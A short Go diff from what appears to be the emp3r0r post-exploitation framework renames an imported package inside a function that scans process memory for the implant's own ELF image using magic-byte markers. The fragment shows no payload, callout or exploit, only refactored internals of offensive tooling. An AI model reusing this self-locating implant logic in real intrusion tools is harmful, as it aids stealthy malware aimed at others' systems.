@@ -9,7 +9,7 @@ import (
 	"log"
 	"os"
 
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/lib/exe_utils"
 )
 
@@ -35,7 +35,7 @@ func FindEmp3r0rELFInMem() (elf_bytes []byte, err error) {
 	}
 
 	for base, mem_region := range mem_regions {
-		if bytes.Contains(mem_region, exe_utils.ELFMAGIC) && bytes.Contains(mem_region, emp3r0r_data.OneTimeMagicBytes) {
+		if bytes.Contains(mem_region, exe_utils.ELFMAGIC) && bytes.Contains(mem_region, emp3r0r_def.OneTimeMagicBytes) {
 			if base != 0x400000 {
 				log.Printf("Found magic string in memory region 0x%x, but unlikely to contain our ELF", base)
 				continue
